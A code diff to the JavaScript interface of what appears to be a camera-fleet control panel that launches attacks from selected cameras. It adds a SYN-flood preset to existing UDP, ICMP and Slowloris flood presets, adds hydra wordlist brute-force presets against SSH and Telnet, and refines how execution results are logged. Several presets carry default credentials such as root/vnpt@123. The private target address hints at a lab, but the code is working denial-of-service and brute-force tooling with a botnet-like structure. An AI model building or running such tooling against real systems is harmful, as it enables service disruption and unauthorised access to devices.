@@ -288,6 +288,7 @@ const PRESETS = {
     { label: 'UDP 100pps', args: '--udp-flood --udp-threads 1 --udp-rate 100 --udp-payload raw --udp-port 514' },
     { label: 'UDP max', args: '--udp-flood --udp-threads 9 --udp-rate 0 --udp-payload raw --udp-port 514' },
     { label: 'ICMP 100pps', args: '--icmp-flood --icmp-threads 2 --icmp-rate 100 --icmp-size 64' },
+    { label: 'SYN flood', args: '--connections 500 --synflood --synflood-threads 20 --synflood-rate 0' },
     { label: 'Slowloris HTTP', args: '80 --connections 50 --dribble 5 --proto http' },
   ],
   recon: [
@@ -300,6 +301,8 @@ const PRESETS = {
   brute: [
     { label: 'Telnet test', args: '--timeout 120 hydra -l root -p vnpt@123 -t 1 -w 5 telnet://192.168.1.28:23' },
     { label: 'SSH test', args: '--timeout 120 hydra -l root -p root -t 1 -w 5 ssh://192.168.1.28:22' },
+    { label: 'SSH files', args: '--timeout 120 hydra -L /home/pi/CamFleetManager/data/hydra-input/user.txt -P /home/pi/CamFleetManager/data/hydra-input/password.txt -t 1 -w 5 ssh://192.168.1.28:22' },
+    { label: 'Telnet files', args: '--timeout 120 hydra -L /home/pi/CamFleetManager/data/hydra-input/user.txt -P /home/pi/CamFleetManager/data/hydra-input/password.txt -t 1 -w 5 telnet://192.168.1.28:23' },
   ],
 };
 
@@ -350,11 +353,18 @@ async function onExec() {
   const label = ips ? `${ips.length} camera đã chọn` : 'tất cả camera';
   const modeLabel = mode === 'dos' ? 'camera_dos' : 'camera-tools';
   UI.appendLog('exec', 'warn', `Chạy ${modeLabel} trên ${label} → ${mode === 'dos' ? target + ' ' : ''}${args}`);
-  try { await client.exec(ips, target, args, mode); } catch (e) {
+  try {
+    const result = await client.exec(ips, target, args, mode);
+    const failed = (result.results || []).filter(item => !item.ok);
+    failed.forEach(item => UI.appendLog('exec', 'error', `${item.ip}: ${item.msg}`));
+    if (result.accepted && (result.results || []).some(item => item.ok)) {
+      UI.showMonitorPanel(true);
+    }
+  } catch (e) {
     UI.appendLog('exec', 'error', e.message || String(e));
+  } finally {
+    releaseBtn('exec', btn);
   }
-  UI.showMonitorPanel(true);
-  releaseBtn('exec', btn);
 }
 
 async function onExecStop() {
